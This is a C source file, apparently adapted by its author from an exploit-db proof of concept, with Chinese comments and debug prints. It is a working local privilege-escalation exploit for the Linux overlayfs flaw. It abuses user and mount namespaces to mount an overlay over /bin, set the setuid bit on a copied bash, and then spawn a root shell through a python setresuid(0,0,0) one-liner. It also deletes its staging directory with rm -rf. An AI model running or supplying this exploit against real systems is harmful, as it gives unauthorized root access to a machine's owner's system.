/*************************************************************************
    > File Name       : overlayfs.c
    > Author          : 何能斌
    > Mail            : enjoy5512@163.com 
    > Created Time    : Tue 15 Mar 2016 01:01:22 AM PDT
    > Remake          :
		这个程序是我根据exploit-db.com上给出的POC文档改编而来，因为多进程
		我不会调试，所以只能加入很多输出来查看程序运行的流程，在程序能正常
		运行的基础上删除了很多头文件，少用了一次fork（）
 ************************************************************************/

#include<stdio.h>
#include<unistd.h>
#include<sys/types.h>
#include<sched.h>
#include<linux/sched.h>
#include<signal.h>
#include<sys/mount.h>
#include<stdlib.h>
#include<sys/stat.h>

static char child_stack[1024*1024];

static int child_exec(void *stuff)
{
	printf("entry the child_exec()\n");
	system("rm -rf /tmp/haxhax");
	mkdir("/tmp/haxhax",0777);
	mkdir("/tmp/haxhax/w",0777);
	mkdir("/tmp/haxhax/u",0777);
	mkdir("/tmp/haxhax/o",0777);

	printf("before mount\n");

	if(mount("overlay","/tmp/haxhax/o","overlay",MS_MGC_VAL,"lowerdir=/bin,upperdir=/tmp/haxhax/u,workdir=/tmp/haxhax/w")!=0)
	{
		printf("mount failed...\n");
		fprintf(stderr,"mount failed...\n");
	}
	else
	{
		printf("mount sucess!!\n");
	}
	printf("after mount\n");

	chmod("/tmp/haxhax/w/work",0777);

	chdir("/tmp/haxhax/o");
	chmod("bash",04755);
	chdir("/");
	umount("/tmp/haxhax/o");

	return 0;
}

int main(int argc,char *argv[])
{
	int mount = 10; //用来查看程序运行的顺序
	int status;
	pid_t init;
	int clone_flags = CLONE_NEWNS | SIGCHLD;
	struct stat s;

	printf("%d : before the fork()\n",mount);
	
	if((init = fork()) == 0)
	{
		if(unshare(CLONE_NEWUSER)!=0)
		{
			printf("failed to create new user namespase\n");
		}

		mount = 11;
		printf("%d : after the fork()\n",mount);

		pid_t pid =
			clone(child_exec,child_stack + (1024*1024),clone_flags,NULL);
		if(pid < 0)
		{
			printf("error\n");
			fprintf(stderr,"failed to create new mount namespace\n");
			exit(-1);
		}
		printf("%d : after the clone()\n",mount);

		waitpid(pid,&status,0);
		return 0;
	}
	printf("%d : after the fork()\n",mount);
	
	usleep(30000);

	wait(NULL);

	printf("s.st_mode = %x\n",s.st_mode);
	stat("/tmp/haxhax/u/bash",&s);
	printf("s.st_mode = %x\n",s.st_mode);
	if(s.st_mode == 0x89ed)
	{
		//如果在子进程中chmod("bash",04755)成功，则运行下面的提权命令
		execl("/tmp/haxhax/u/bash","bash","-p","-c","rm -rf /tmp/haxhax;python -c \"import os;os.setresuid(0,0,0);os.execl('/bin/bash','bash');\"",NULL);
	}
	else
	{
		printf("execl error!!\n");
	}

    return 0;
}
